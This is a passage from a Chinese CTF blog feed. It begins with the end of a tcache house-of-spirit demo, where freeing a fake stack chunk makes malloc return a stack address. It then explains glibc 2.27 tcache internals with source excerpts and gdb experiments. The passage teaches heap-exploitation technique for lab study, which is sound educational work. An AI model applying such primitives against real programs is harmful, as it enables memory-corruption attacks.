class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">assert((<span class="type">long</span>)b == (<span class="type">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在<code>ubuntu18.04</code>中<code>glibc2.27</code>版本，使用<code>gcc</code>编译该程序，对该程序进行动态调试。</li><li>直接使用<code>ni</code>将程序执行到<code>free(a)</code>这边（<code>free(a)</code>还没有执行完），在执行<code>free(a)</code>之前，我们先使用<code>heap</code>查看堆块，再使用<code>tcachebin</code>查看<code>tcachebin</code>中管理的空闲堆块，并且使用<code>stack</code>命令查看栈上伪造的<code>chunk</code>。</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180202557.png" alt="image-20250124180202557"></p><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180124281.png" alt="image-20250124180124281"></p><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180136631.png" alt="image-20250124180136631"></p><ul><li>栈上伪造的chunk位置和内容如下：</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180317417.png" alt="image-20250124180317417"></p><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180532506.png" alt="image-20250124180532506"></p><ul><li>之后执行<code>free(a)</code>，再使用<code>tcachebin</code>查看<code>tcachebin</code>管理的空闲链表。</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180633016.png" alt="image-20250124180633016"></p><ul><li>再使用<code>heap</code>命令，看到如下堆块内容。</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/image-20250124180732338.png" alt="image-20250124180732338"></p><ul><li>这时我们再执行完<code>malloc</code>，查看<code>tcachebin</code>和<code>heap</code></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-spirit-2/Snipaste_2025-01-24_18-08-37.png" alt="Snipaste_2025-01-24_18-08-37"></p><h1 id="tcachebin_spirit_level_1"><a class="markdownIt-Anchor" href="#tcachebin_spirit_level_1"></a> tcachebin_spirit_level_1</h1>]]></content>
    
    
    <summary type="html">前言：tcache_bin的spirit</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>tcache_bin运行机制</title>
    <link href="http://iyheart.github.io/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/"/>
    <id>http://iyheart.github.io/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/</id>
    <published>2025-01-14T15:12:17.000Z</published>
    <updated>2025-02-01T03:07:32.294Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>之前只学了<code>fast_bin</code>和稍微了解了一下其他bins的结果和运行操作，一直都没去碰<code>tcache_bins</code>今天就来具体了解一下<code>tcache_bins</code>的整个运行流程和具体细节。</p></li><li><p><code>tcache_bins</code>是在<code>glibc2.26</code>新添加进来的，由于是刚引入，所以不是很安全，之后在<code>glibc2.27</code>中的<code>tache_bins</code>才相对稳定一点，所以在PWN比赛题目中，更经常遇到的是<code>glibc2.27</code>版本的<code>tcache_bin</code>漏洞利用。在本文的最后会附上<code>glibc2.26</code>和<code>glibc2.27</code>中与<code>tcache_bin</code>相关的源代码。</p></li><li><p>参考博客：</p><ul><li><a href="https://www.yuque.com/cyberangel/rg9gdm/slwmab">PWN入门（3-15-1）-Tcache Attack综述（libc-2.27.so）</a></li><li><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/tcache-attack/#tcache-makes-heap-exploitation-easy-again">Tcache attack - CTF Wiki</a></li></ul></li></ul><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><h2 id="简单介绍"><a class="markdownIt-Anchor" href="#简单介绍"></a> 简单介绍</h2><ul><li><p>tcache引入的目的是加速内存的分配，但是引入该机制后安全性就大打折扣了。由于更经常提到的是<code>glibc2.27</code>版本的<code>tcache</code>，所以本文介绍就以<code>glibc2.27</code>版本的<code>tcache</code>为主。</p></li><li><p>tcache全名为<code>thread local caching</code>，它为每个线程创建一个缓存<code>cache</code>，从而实现无锁分配算法。</p></li><li><p><code>tcache</code>的具体描述：</p><ul><li><code>tcache_bin</code>和<code>fastbin</code>类似，都是一个指针数组，每个指针数组都用来管理空闲的堆块。这些堆块也是被组织成链表，这些链表都是采用<code>后进先出</code>的规则。</li><li><code>tcache_bin</code>中，一个数组元素（是指向空闲chunk的指针），管理着相同大小的<code>chunk</code>，不同大小的chunk，会被放入其他数组元素中管理</li><li><code>tcache_bin</code>中，每个数组元素管理的空闲堆块（即链表节点数）不能超过7个。即当<code>tcache_bin</code>一个数组元素管理空闲堆块为7个时，当释放第8个相同大小的堆块，该堆块并不会被放入<code>tcache_bin</code>中，而是直接被放入<code>fast_bin</code>或者其他<code>bins</code></li><li><code>tcache_bin</code>数组一共有64个元素，也就是<code>tcache_bin</code>可以管理从<code>chunk</code>的<code>size</code>位为<code>0x20</code>到<code>chunk</code>的<code>size</code>为<code>0x410</code>大小的堆块。当申请的<code>chunk</code>中<code>size</code>位大小为<code>0x420</code>时，释放该<code>chunk</code>，该<code>chunk</code>就会被放入<code>unsorted_bin</code>中。</li></ul></li><li><p><code>tcachebin</code>与<code>fastbin</code>的相同点和不同点：</p><ul><li>相同：<code>tcachebin</code>和<code>fastbin</code>都是单链链表管理chunk，并且每个chunk都是利用<code>fd</code>指针。</li><li>不同：<code>tcachebin</code>的<code>fd</code>指针指向的是chunk的<code>fd</code>指针的位置，而fastbin中的fd指针是指向<code>pre_size</code>的位置</li></ul></li><li><p>接下来用图片描述一下<code>tcache_bin</code>：</p></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121192716388.png" alt="image-20250121192716388"></p><ul><li>在源码中，使用如下代码来管理<code>tcache_bins</code>：<ul><li>所以这边有一个数组<code> char counts[TCACHE_MAX_BINS];</code>是统计每个索引里面链表的个数</li><li><code>tcache_entry *entries[TCACHE_MAX_BINS];</code>这个就是上图所示的一个管理空闲链表的结构</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><ul><li>所以上图<code>tcache_bin</code>更完整的图片是这样的：</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121221922548.png" alt="image-20250121221922548"></p><h2 id="tcache_bin的malloc和free过程"><a class="markdownIt-Anchor" href="#tcache_bin的malloc和free过程"></a> tcache_bin的malloc和free过程</h2><ul><li>在<code>tcache_bin</code>中有两个相关的操作，分别是<code>tcache_get()</code>和<code>tcache_put()</code>，其中<code>tcache_get()</code>是将被<code>free</code>后，并且放入<code>tcache_bin</code>中的chunk给拿出来再次使用。而<code>tcache_put()</code>是将<code>free</code>后的chunk放入<code>tcache_bin</code>的函数。</li><li>这个是<code>tcache_get</code>的过程<ul><li>在调用<code>tcache_get</code>之前，先会计算我们所申请堆块大小对应的<code>tcache_bin</code>的索引值，并在调用<code>tcache_get</code>的时候做为参数传入进去。</li><li>然后取对应数组索引里面的数据（即指向<code>chunk</code>的指针，如果没有<code>chunk</code>，里面默认保存<code>0</code>）</li><li>先对<code>tc_idx</code>进行判断，然后再对数组索引里面的数据进行判断</li><li>之后就是取出操作，并且改变<code>counts[tc_idx]</code>中的值（这里面存储着每个索引值所拥有的chunk链表数）</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tcache_get (<span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来就是介绍<code>tcache_puts</code>的过程：<ul><li>这个函数会传入要释放的堆块，和这个堆块对应的<code>tc_idx</code>（即索引值）</li><li>使用一个指针，指向要释放的堆块</li><li>对<code>tc_idx</code>进行一个判断</li><li>之后就是一个头插法加入链表的过程</li><li>并且更新<code>counts[tc_idx]</code>里面对应的链表个数</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>这三个实验只是用来真实体会一下<code>tcache</code>的链表结构，本实验是在<code>docker</code>中的<code>ubuntu18.04</code>环境中进行的对应的<code>glibc2.27</code></li></ul><h2 id="实验1"><a class="markdownIt-Anchor" href="#实验1"></a> 实验1</h2><ul><li>体会每个相同的<code>chunk</code>最多只能组成<code>7</code>个结点的链表，链在<code>tchace_bin</code>上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span>* p[<span class="number">20</span>];</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">        p[<span class="number">0</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">1</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">2</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">3</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">4</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">5</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">6</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">7</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">8</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">9</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">10</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">11</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">12</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">13</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">14</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">15</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">16</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">17</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">18</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">19</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">3</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">4</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">5</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">6</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">7</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">8</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">9</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">10</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">11</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">12</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">13</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">14</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">15</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">16</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">17</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -o test1 test1.c</span></span><br></pre></td></tr></table></figure><ul><li>使用<code>gdb</code>进行动态调试，使用<code>ni</code>命令将<code>malloc(0x20)</code>都执行完，在执行第一个<code>free</code>之前先查看一下<code>tcache_bins</code>，目前<code>tcache_bins</code>还是空的</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121222748346.png" alt="image-20250121222748346"></p><ul><li>然后释放一个堆块，查看<code>tcache_bins</code>，发现被释放的堆块已经放入了<code>tcache_bins</code>中</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121222915304.png" alt="image-20250121222915304"></p><ul><li>之后再释放<code>6</code>个堆块，使得<code>tcachebins</code>中管理<code>0x20</code>大小的堆块链满7个chunk</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121223100752.png" alt="image-20250121223100752"></p><ul><li>现在再释放一个堆块，查看<code>tcache_bin</code>和<code>fast_bin</code>，就会发现第<code>8</code>个<code>size</code>为0x20的堆块被放入了<code>fast_bin</code>中</li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121223232732.png" alt="image-20250121223232732"></p><h2 id="实验2"><a class="markdownIt-Anchor" href="#实验2"></a> 实验2</h2><ul><li>实验2将体会<code>tcache_bins</code>最大能管理多大的chunk</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span>* p[<span class="number">20</span>];</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line">        p[<span class="number">0</span>]=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">        p[<span class="number">1</span>]=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">        p[<span class="number">2</span>]=<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        p[<span class="number">3</span>]=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">        p[<span class="number">4</span>]=<span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">        p[<span class="number">5</span>]=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">        p[<span class="number">6</span>]=<span class="built_in">malloc</span>(<span class="number">0x70</span>);</span><br><span class="line">        p[<span class="number">7</span>]=<span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">        p[<span class="number">8</span>]=<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">        p[<span class="number">9</span>]=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">        p[<span class="number">10</span>]=<span class="built_in">malloc</span>(<span class="number">0x110</span>);</span><br><span class="line">        p[<span class="number">11</span>]=<span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">        p[<span class="number">12</span>]=<span class="built_in">malloc</span>(<span class="number">0x130</span>);</span><br><span class="line">    p[<span class="number">13</span>]=<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">        p[<span class="number">14</span>]=<span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">        p[<span class="number">15</span>]=<span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">12</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">13</span>]);</span><br><span class="line">        <span class="built_in">free</span>(p[<span class="number">14</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"># gcc -o test2 test2.c</span></span><br></pre></td></tr></table></figure><ul><li>先将程序执行到free之前，查看<code>fast_bin</code>、<code>tcache_bin</code>和<code>unsorted_bin</code></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121224008428.png" alt="image-20250121224008428"></p><ul><li>执行了一次<code>free</code>后我们先来查看堆块，在查看一下<code>tcachebin</code></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121224424931.png" alt="image-20250121224424931"></p><ul><li>之后继续执行二次<code>free</code>，再查看堆块和<code>tcachebin</code>以及<code>unsortedbin</code>，这时就会发现<code>tcachebin</code>所能管理的最大size的chunk为<code>0x410</code></li></ul><p><img src="/2025/01/14/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/tcache-bin%E8%BF%90%E8%A1%8C%E6%9C%BA%E5%88%B6/image-20250121224611538.png" alt="image-20250121224611538"></p><h1 id="相关源码"><a class="markdownIt-Anchor" href="#相关源码"></a> 相关源码</h1><div class="tabs" id="tcache相关源码"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="tcache相关源码-1">tcache相关源码 1</button><button type="button" class="tab " data-href="tcache相关源码-2">tcache相关源码 2</button></ul><div class="tab-contents"><div class="tab-item-content active" id="tcache相关源码-1"><ul><li>这是<code>glibc2.26</code>中<code>tcache</code>的相关源码</li></ul><details>    <summary>宏定义相关</summary><ul><li>这边定义了<code>Tcache</code>，在<code>glibc2.26</code>中<code>malloc.c</code>的第<code>302</code>行到第<code>324行</code><ul><li>在第<code>3行</code>定义了<code>TCACHE_MAX_BINS</code>为<code>64</code></li><li>在第<code>22行</code>代码中声明每个<code>Tcache_bin</code>中管理的链表最大长度为7</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line"><span class="comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_MAX_BINS64</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used to pre-fill the tunables.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is from chunksize().  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br><span class="line"><span class="comment">/* When &quot;x&quot; is a user-provided size.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></details><details>    <summary>tcache_bin相关操作</summary><ul><li>在<code>glibc2.26</code>中<code>malloc.c</code>的第<code>2921</code>行到第<code>3040</code>行，这些代码定义了<code>tcache</code>的相关操作</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 